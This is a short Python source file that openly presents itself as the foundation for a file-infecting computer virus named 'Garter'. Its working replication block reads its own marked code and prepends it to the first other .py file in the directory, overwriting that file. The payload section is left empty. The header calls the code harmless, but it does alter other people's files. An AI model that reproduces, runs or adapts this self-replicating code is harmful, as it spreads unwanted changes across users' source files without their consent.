'''
==============================================================================
"Garter" - By Zgell
A simple and harmless foundation for a Python-based computer virus capable of
infecting nearby files and executing a specific payload.
==============================================================================
'''



### REPLICATION START ###
# Self-Replication Section
import os, glob
selfname = os.path.basename(__file__)

targets = glob.glob('*.py')
targets.remove(selfname)
with open(targets[0], 'r') as tr:
    target_data = tr.readlines()
twrite = open(targets[0], 'w')

f = open(selfname, 'r')
selffile = f.readlines()

index_start = selffile.index('### REPLICATION START ###\n')
index_end = selffile.index('### REPLICATION END ###\n') + 1
viral_content = selffile[index_start:index_end]
viral_content.append('\n')
viral_content.extend(target_data)
for line in viral_content:
    twrite.write(line)

twrite.close()
f.close()
# Payload Section

### REPLICATION END ###



'''
for line in targetfile:
    # Since each line has '\n' character, remove it
    print(line.replace('\n', ''))

for line in selffile:
	print(line.replace('\n', ''))
'''
